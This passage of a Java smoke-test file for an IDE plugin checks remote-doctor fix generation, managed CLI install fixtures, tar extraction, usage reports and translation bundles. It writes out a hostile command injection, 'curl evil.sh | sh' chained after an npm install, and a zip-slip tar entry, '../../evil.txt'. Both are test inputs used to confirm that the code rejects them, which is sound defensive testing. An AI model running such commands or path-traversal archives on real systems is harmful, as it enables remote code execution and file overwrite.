        eq(PluginQuality.deriveLspAvailability(new ArrayList<PluginQuality.LspEntry>(), down),
                "none", "pq no declared lsp -> none");

        Map<String, Object> p = new LinkedHashMap<String, Object>();
        p.put("name", "lsp-only");
        p.put("version", "1.0.0");
        p.put("scope", "user");
        p.put("dir", "/p");
        p.put("ok", Boolean.TRUE);
        Map<String, PluginQuality.Validation> vals =
                new LinkedHashMap<String, PluginQuality.Validation>();
        vals.put("lsp-only", lspOnly);
        List<PluginQuality.Row> rows =
                PluginQuality.buildQualityRows(Arrays.asList(p), vals, down);
        eq(rows.get(0).unused, Boolean.FALSE, "pq lsp-only is NOT unused");
        eq(rows.get(0).lsp, "unavailable", "pq row lsp verdict");
        check(PluginQuality.flagsFor(rows.get(0)).contains("lsp unavailable"),
                "pq flag rendered");
        check(!PluginQuality.flagsFor(rows.get(0)).toString().contains("slow"),
                "pq no fabricated slow flag");

        List<PluginQuality.Row> degraded = PluginQuality.buildQualityRows(
                Arrays.asList(p), new LinkedHashMap<String, PluginQuality.Validation>(), null);
        check(degraded.get(0).broken == null && degraded.get(0).unused == null
                && "unknown".equals(degraded.get(0).lsp), "pq missing validate degrades honestly");
        check(PluginQuality.buildQualityRows(null, vals, null) == null,
                "pq unreadable plugin list -> null");
        check(PluginQuality.describe(null, true).contains("could not read plugins"),
                "pq describe unreadable state");
        check(PluginQuality.describe(new ArrayList<PluginQuality.Row>(), true)
                .contains("No runtime plugins installed"), "pq describe empty state");
        check(PluginQuality.summaryLine(rows, false).contains("lsp probe: unavailable"),
                "pq summary probe warning");
    }

    /**
     * RemoteDoctorFixes — one-click fix classification/generation (gap #12,
     * VS remote-doctor-fixes.js twin): three tiers off real analyze checks,
     * allowlist teeth, .ps1 invariants (elevation/idempotent/ASCII/injection-
     * proof) and the JB-specific Remote Development host check.
     */
    private static void remoteDoctorFixes() {
        System.out.println("RemoteDoctorFixes (one-click fixes — VS remote-doctor-fixes.js twin)");
        RemoteDoctor.Signals s = new RemoteDoctor.Signals();
        s.isWsl = true;
        s.cliFound = true;
        s.cliVersion = "0.162.100";
        s.minCliVersion = "0.162.150";
        s.bridgePort = 51234;
        s.portProbe = "unknown";
        List<RemoteDoctor.Check> checks = RemoteDoctor.analyze(s).checks;
        List<RemoteDoctorFixes.Fix> fixes = RemoteDoctorFixes.classifyFixes(checks);
        boolean auto = false, scriptTier = false, manual = false;
        for (RemoteDoctorFixes.Fix f : fixes) {
            if ("cli-outdated".equals(f.id)) {
                auto = RemoteDoctorFixes.KIND_AUTO.equals(f.kind)
                        && "npm install -g chainlesschain@latest".equals(f.command);
            } else if ("firewall".equals(f.id)) {
                scriptTier = RemoteDoctorFixes.KIND_SCRIPT.equals(f.kind) && f.port == 51234;
            } else if ("wsl-networking".equals(f.id)) {
                manual = RemoteDoctorFixes.KIND_MANUAL.equals(f.kind)
                        && RemoteDoctorFixes.ACT_WSLCONFIG.equals(f.actionType);
            }
        }
        check(auto, "rdf autoApplicable tier (allowlisted npm)");
        check(scriptTier, "rdf scriptable tier (validated port)");
        check(manual, "rdf manualOnly tier (wslconfig)");

        String ps1 = RemoteDoctorFixes.buildFirewallFixScript(checks);
        check(ps1.startsWith("#Requires -RunAsAdministrator\r\n"), "rdf elevation header first line");
        check(ps1.contains("already exists - skipping"), "rdf idempotency guard");
        check(ps1.chars().allMatch(c -> c <= 0x7F), "rdf script pure ASCII");
        check(ps1.contains("$ports = @(51234)"), "rdf only validated digits embedded");
        RemoteDoctorFixes.WslConfigPatch patch = RemoteDoctorFixes.buildWslConfigPatch(checks);
        eq(patch.ini, "[wsl2]\nnetworkingMode=mirrored\n", "rdf wslconfig ini");
        eq(patch.postStep, "wsl --shutdown", "rdf wslconfig post step");

        List<RemoteDoctorFixes.Fix> hostile = RemoteDoctorFixes.classifyFixes(Arrays.asList(
                new RemoteDoctor.Check("warn", "cli-outdated", "t", "d",
                        "npm install -g chainlesschain@latest && curl evil.sh | sh")));
        check(RemoteDoctorFixes.KIND_MANUAL.equals(hostile.get(0).kind)
                && RemoteDoctorFixes.ACT_COPY.equals(hostile.get(0).actionType),
                "rdf tampered command degrades to copy-only");
        check(RemoteDoctorFixes.buildFirewallFixScript(Arrays.asList(
                new RemoteDoctor.Check("warn", "firewall", "t", "d", "localport=evil"))) == null,
                "rdf non-numeric port -> no script");

        RemoteDoctor.Signals rd = new RemoteDoctor.Signals();
        rd.remoteDevClient = true;
        rd.cliFound = true;
        rd.cliVersion = "0.162.156";
        rd.minCliVersion = "0.162.150";
        rd.bridgePort = 51234;
        rd.portProbe = "listening";
        RemoteDoctor.Result r = RemoteDoctor.analyze(rd);
        boolean infoCheck = false;
        for (RemoteDoctor.Check c : r.checks) {
            if ("jb-remote-dev".equals(c.id) && "info".equals(c.level)
                    && c.detail.contains("HOST")) {
                infoCheck = true;
            }
        }
        check(infoCheck, "rdf remote-dev host advisory present (info level)");
        eq(r.level, "ok", "rdf info never degrades the verdict");
        check(r.summary.contains("ℹ"), "rdf info icon in summary");
    }

    /**
     * l10n bundle parity gate (真·本地化): every plugin.xml action id must have a
     * .text + .description key in the English base bundle, and CcBundle.properties
     * must have the SAME key set as CcBundle_zh.properties — so a zh IDE never
     * shows a blank menu item and a new action can't ship without its translation.
     * Reads the resource files by relative path (works from the plugin dir under
     * both `gradlew smokeTest` and the manual javac repro).
     */
    /**
     * Managed CLI runtime (gap #2 插件托管/内置 CLI) — the decision core must
     * produce byte-identical results with the VS Code twin on the SHARED
     * fixtures in packages/vscode-extension/src/__fixtures__/managed-cli/.
     * The fixture-file-exists guard makes fixture drift (moved/renamed files)
     * fail the smoke instead of silently running zero cases.
     */
    private static void managedCli() {
        System.out.println("ManagedCli (twin fixtures + tar + seam):");
        java.io.File dir = null;
        for (String root : new String[] {
                "../vscode-extension", "packages/vscode-extension" }) {
            java.io.File d = new java.io.File(root + "/src/__fixtures__/managed-cli");
            if (d.isDirectory()) { dir = d; break; }
        }
        check(dir != null, "shared managed-cli fixture dir exists (twin drift guard)");
        if (dir == null) return;
        for (String f : new String[] { "registry-meta.json", "plan-cases.json",
                "verify-cases.json", "state-cases.json", "candidate-cases.json" }) {
            check(new java.io.File(dir, f).isFile(), "fixture file exists: " + f);
        }
        Map<String, Object> registryMeta;
        List<Object> planCases;
        List<Object> verifyCases;
        List<Object> stateCases;
        List<Object> candidateCases;
        try {
            registryMeta = smokeJsonObj(new java.io.File(dir, "registry-meta.json"));
            planCases = smokeJsonArr(new java.io.File(dir, "plan-cases.json"));
            verifyCases = smokeJsonArr(new java.io.File(dir, "verify-cases.json"));
            stateCases = smokeJsonArr(new java.io.File(dir, "state-cases.json"));
            candidateCases = smokeJsonArr(new java.io.File(dir, "candidate-cases.json"));
        } catch (Exception e) {
            check(false, "fixtures parse as JSON: " + e);
            return;
        }
        check(planCases.size() >= 12, "plan case count (" + planCases.size() + ")");
        check(verifyCases.size() >= 3, "verify case count (" + verifyCases.size() + ")");
        check(stateCases.size() >= 7, "state case count (" + stateCases.size() + ")");
        check(candidateCases.size() >= 14,
                "candidate case count (" + candidateCases.size() + ")");

        // plan-cases: full deep-equal with the JS twin's expected values.
        for (Object o : planCases) {
            Map<String, Object> c = castMap(o);
            Map<String, Object> input = castMap(c.get("input"));
            Object metaRef = input.get("metaRef");
            Map<String, Object> res = ManagedCli.planManagedInstall(
                    (String) input.get("requestedVersion"),
                    metaRef == null ? null : castMap(registryMeta.get(metaRef)),
                    (String) input.get("floorVersion"));
            eq(res, c.get("expected"), "plan: " + c.get("name"));
        }
        // verify-cases: every key present in expected must match.
        for (Object o : verifyCases) {
            Map<String, Object> c = castMap(o);
            Map<String, Object> res = ManagedCli.verifyTarball(
                    ((String) c.get("payloadUtf8"))
                            .getBytes(java.nio.charset.StandardCharsets.UTF_8),
                    castMap(c.get("integrity")));
            for (Map.Entry<String, Object> e : castMap(c.get("expected")).entrySet()) {
                eq(res.get(e.getKey()), e.getValue(),
                        "verify[" + e.getKey() + "]: " + c.get("name"));
            }
        }
        // state-cases: next/rollback transitions with the injected now.
        for (Object o : stateCases) {
            Map<String, Object> c = castMap(o);
            Map<String, Object> input = castMap(c.get("input"));
            Map<String, Object> res;
            if ("next".equals(c.get("op"))) {
                res = ManagedCli.nextState(
                        (String) input.get("version"),
                        input.get("previousState") == null
                                ? null : castMap(input.get("previousState")),
                        ((Number) input.get("now")).longValue());
            } else {
                @SuppressWarnings("unchecked")
                List<Object> disk = (List<Object>) input.get("diskVersions");
                res = ManagedCli.rollbackPlan(
                        input.get("state") == null ? null : castMap(input.get("state")),
                        disk::contains,
                        ((Number) input.get("now")).longValue());
            }
            eq(res, c.get("expected"), "state: " + c.get("name"));
        }
        // candidate-cases: the fixture-locked decision order (explicit > global
        // ≥ floor > managed > below-floor-global > none) + diagnostic codes.
        for (Object o : candidateCases) {
            Map<String, Object> c = castMap(o);
            eq(ManagedCli.deriveCliCandidates(castMap(c.get("input"))),
                    c.get("expected"), "candidates: " + c.get("name"));
        }

        // Tar reader: zip-slip fail-closed + GNU @LongLink long-name support.
        byte[] slip = smokeTgz(
                smokeTarEntry("package/../../evil.txt", "pwned", '0'),
                smokeTarEntry("package/package.json", "{}", '0'));
        ManagedCli.Extraction slipRes = ManagedCli.extractPackage(slip);
        eq(slipRes.error, "unsafe-path", "tar zip-slip rejected");
        StringBuilder ln = new StringBuilder("package/gnu/");
        for (int i = 0; i < 150; i++) ln.append('x');
        String longName = ln.append(".js").toString();
        byte[] gnu = smokeTgz(
                smokeTarEntry("././@LongLink", longName + "\0", 'L'),
                smokeTarEntry("package/gnu-trunc", "gnu long content", '0'));
        ManagedCli.Extraction gnuRes = ManagedCli.extractPackage(gnu);
        check(gnuRes.error == null && gnuRes.files.size() == 1
                && longName.equals(gnuRes.files.get(0).path), "tar @LongLink long name");
        eq(ManagedCli.extractPackage(
                        smokeTgz(smokeTarEntry("other/file.js", "x", '0'))).error,
                "unexpected-layout", "tar non-package layout fail-closed");

        // Resolution seam: managed only after every global probe fails; a
        // usable global wins without consulting the supplier.
        eq(AgentChatSession.chooseBinaryOrManaged(cand -> null, () -> "/store/cc-managed"),
                "/store/cc-managed", "seam: managed after all probes fail");
        final int[] consulted = { 0 };
        eq(AgentChatSession.chooseBinaryOrManaged(
                        cand -> "cc".equals(cand) ? "0.162.158" : null,
                        () -> { consulted[0]++; return "/store/cc-managed"; }),
                "cc", "seam: global wins");
        eq(consulted[0], 0, "seam: managed never consulted when a global answers");
        eq(AgentChatSession.chooseBinaryOrManaged(cand -> null, () -> {
            throw new RuntimeException("boom");
        }), null, "seam: throwing supplier falls through");
    }

    @SuppressWarnings("unchecked")
    private static Map<String, Object> castMap(Object o) {
        return (Map<String, Object>) o;
    }

    private static Map<String, Object> smokeJsonObj(java.io.File f) throws java.io.IOException {
        return castMap(MiniJson.parse(new String(
                java.nio.file.Files.readAllBytes(f.toPath()),
                java.nio.charset.StandardCharsets.UTF_8)));
    }

    @SuppressWarnings("unchecked")
    private static List<Object> smokeJsonArr(java.io.File f) throws java.io.IOException {
        return (List<Object>) MiniJson.parse(new String(
                java.nio.file.Files.readAllBytes(f.toPath()),
                java.nio.charset.StandardCharsets.UTF_8));
    }

    /** Compact tar-entry builder (header + padded data) for the smoke checks. */
    private static byte[] smokeTarEntry(String name, String content, char type) {
        byte[] data = content.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        long size = type == '5' ? 0 : data.length;
        byte[] h = new byte[512];
        byte[] nb = name.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        System.arraycopy(nb, 0, h, 0, Math.min(nb.length, 100));
        byte[] mode = "0000644\0".getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);
        System.arraycopy(mode, 0, h, 100, mode.length);
        StringBuilder oct = new StringBuilder(Long.toOctalString(size));
        while (oct.length() < 11) oct.insert(0, '0');
        byte[] sz = (oct + "\0").getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);
        System.arraycopy(sz, 0, h, 124, sz.length);
        h[156] = (byte) type;
        byte[] magic = "ustar".getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);
        System.arraycopy(magic, 0, h, 257, magic.length);
        java.util.Arrays.fill(h, 148, 156, (byte) 0x20);
        long sum = 0;
        for (byte b : h) sum += b & 0xff;
        StringBuilder cs = new StringBuilder(Long.toOctalString(sum));
        while (cs.length() < 6) cs.insert(0, '0');
        byte[] csb = (cs + "\0 ").getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);
        System.arraycopy(csb, 0, h, 148, csb.length);
        java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
        out.writeBytes(h);
        if (size > 0) {
            byte[] padded = new byte[(int) ((size + 511) / 512) * 512];
            System.arraycopy(data, 0, padded, 0, (int) size);
            out.writeBytes(padded);
        }
        return out.toByteArray();
    }

    private static byte[] smokeTgz(byte[]... entries) {
        try {
            java.io.ByteArrayOutputStream tar = new java.io.ByteArrayOutputStream();
            for (byte[] e : entries) tar.writeBytes(e);
            tar.writeBytes(new byte[1024]);
            java.io.ByteArrayOutputStream gz = new java.io.ByteArrayOutputStream();
            try (java.util.zip.GZIPOutputStream out = new java.util.zip.GZIPOutputStream(gz)) {
                out.write(tar.toByteArray());
            }
            return gz.toByteArray();
        } catch (java.io.IOException e) {
            throw new AssertionError(e);
        }
    }

    private static void usageReport() {
        System.out.println("UsageReport (attribution):");
        long now = java.time.Instant.parse("2026-07-10T12:00:00Z").toEpochMilli();

        // Old CLI (no attribution section) → legacy footer, no new sections.
        String legacyJson = "{\"total\":{\"inputTokens\":1000,\"outputTokens\":500,"
                + "\"totalTokens\":1500,\"calls\":12},\"sessions\":[],\"byModel\":[]}";
        String legacy = UsageReport.render(UsageReport.parseUsageJson(legacyJson),
                SessionList.parseSessionList("[]"), now);
        check(legacy.contains("needs CLI-side event tagging"), "legacy footer kept without attribution");
        check(!legacy.contains("By origin:"), "no attribution sections without the CLI section");
        check(UsageReport.deriveUsageHints(UsageReport.parseUsageJson(legacyJson)).isEmpty(),
                "no hints without attribution");
        check(UsageReport.normalizeAttribution("garbage") == null, "malformed attribution -> null");

        // New CLI: attribution sections + all three hints (VS-twin fixture).
        String attributed = "{"
                + "\"total\":{\"inputTokens\":120000,\"outputTokens\":8000,\"totalTokens\":128000,"
                + "\"cacheReadTokens\":2000,\"cacheCreationTokens\":5000,\"calls\":2},"
                + "\"sessions\":[],\"byModel\":[],"
                + "\"attribution\":{"
                + "\"byOrigin\":[{\"origin\":\"subagent\",\"inputTokens\":70000,\"outputTokens\":4000,"
                + "\"totalTokens\":74000,\"calls\":3},{\"origin\":\"main\",\"inputTokens\":50000,"
                + "\"outputTokens\":4000,\"totalTokens\":54000,\"calls\":8}],"
                + "\"bySkill\":[{\"skill\":\"csv-clean\",\"inputTokens\":10,\"outputTokens\":5,"
                + "\"totalTokens\":15,\"calls\":1}],"
                + "\"bySubagent\":[{\"subagentId\":\"sub-1\",\"role\":\"researcher\",\"origin\":\"subagent\","
                + "\"totalTokens\":74000,\"calls\":3}],"
                + "\"tools\":{\"totalCalls\":7,\"totalErrors\":2,"
                + "\"byTool\":[{\"tool\":\"read_file\",\"mcpServer\":null,\"calls\":4,\"errors\":1,\"turnTokens\":600}],"
                + "\"byMcpServer\":[{\"server\":\"github\",\"calls\":3,\"errors\":1,\"turnTokens\":150}]}}"
                + "}";
        String report = UsageReport.render(UsageReport.parseUsageJson(attributed),
                SessionList.parseSessionList("[]"), now);
        check(report.contains("By origin:"), "By origin section renders");
        check(report.contains("57.8%"), "origin share % renders");
        check(report.contains("By skill:") && report.contains("csv-clean"), "By skill renders");
        check(report.contains("By subagent:") && report.contains("sub-1"), "By subagent renders");
        check(report.contains("Tool calls: 7 calls · 2 errors across 1 tool(s)"), "tool totals header");
        check(report.contains("MCP servers:"), "MCP server bucket renders");
        check(report.contains("do not sum that column across rows"), "turnTokens caveat present");
        check(!report.contains("needs CLI-side event tagging"), "stale footer replaced");
        check(report.contains("- Sub-agent-heavy: 58%"), "subagent hint fires");
        check(report.contains("- High cache-miss: only 2,000 cache-read"), "cache-miss hint fires");
        check(report.contains("- Long-context: average input per LLM call is 60,000"), "long-context hint fires");

        // Boundary: exactly at the subagent share threshold → strict > → silent.
        String atThreshold = "{\"total\":{\"inputTokens\":100,\"outputTokens\":10,\"totalTokens\":110,\"calls\":12},"
                + "\"sessions\":[],\"byModel\":[],"
                + "\"attribution\":{\"byOrigin\":[{\"origin\":\"subagent\",\"totalTokens\":40,\"calls\":1},"
                + "{\"origin\":\"main\",\"totalTokens\":60,\"calls\":1}],"
                + "\"bySkill\":[],\"bySubagent\":[],\"tools\":{}}}";
        check(UsageReport.deriveUsageHints(UsageReport.parseUsageJson(atThreshold)).isEmpty(),
                "share exactly at threshold stays silent");
    }

    private static void bundleParity() {
        System.out.println("bundleParity (l10n action keys en <-> zh <-> plugin.xml)");
        java.util.Properties en = loadProps("src/main/resources/messages/CcBundle.properties");
        java.util.Properties zh = loadProps("src/main/resources/messages/CcBundle_zh.properties");
        String xml = readText("src/main/resources/META-INF/plugin.xml");
        if (en == null || zh == null || xml == null) {
            check(false, "bundle/plugin.xml resources readable");
            return;
        }
        // Every <action id="…"> needs .text + .description in the English base.
        java.util.regex.Matcher m =
                java.util.regex.Pattern.compile("<action\\s+id=\"([^\"]+)\"").matcher(xml);
        int actions = 0;
        while (m.find()) {
            String id = m.group(1);
            actions++;
            check(en.containsKey("action." + id + ".text"), "en has action." + id + ".text");
            check(en.containsKey("action." + id + ".description"),
                    "en has action." + id + ".description");
        }
        check(actions >= 17, "found the action set (" + actions + ")");
        // en/zh key sets identical (no orphan, no missing translation).
        java.util.Set<Object> ek = en.keySet(), zk = zh.keySet();
        for (Object k : ek) check(zk.contains(k), "zh translates " + k);
        for (Object k : zk) check(ek.contains(k), "en base for " + k);
        // No English text leaked into the zh bundle (each zh value differs — the
        // action titles/descriptions are all translated, not copied through).
        int identical = 0;
        for (Object k : ek) {
            if (zh.containsKey(k) && en.getProperty((String) k).equals(zh.getProperty((String) k))) {
                identical++;
            }
        }
        check(identical == 0, "no zh value left equal to the English base (" + identical + " untranslated)");
    }

    private static java.util.Properties loadProps(String rel) {
        java.io.File f = resolveResource(rel);
        if (f == null) return null;
        java.util.Properties p = new java.util.Properties();
        try (java.io.Reader r = new java.io.InputStreamReader(
                new java.io.FileInputStream(f), java.nio.charset.StandardCharsets.UTF_8)) {
            p.load(r);
            return p;
        } catch (java.io.IOException e) {
            return null;
        }
    }

    private static String readText(String rel) {
        java.io.File f = resolveResource(rel);
        if (f == null) return null;
        try {
            return new String(java.nio.file.Files.readAllBytes(f.toPath()),
                    java.nio.charset.StandardCharsets.UTF_8);
        } catch (java.io.IOException e) {
            return null;
        }
    }

    /** Tolerate cwd = plugin dir OR repo root (gradle vs manual repro). */
    private static java.io.File resolveResource(String rel) {
        for (String root : new String[] {"", "packages/jetbrains-plugin/"}) {
            java.io.File f = new java.io.File(root + rel);
            if (f.isFile()) return f;
        }
        return null;
    }
}
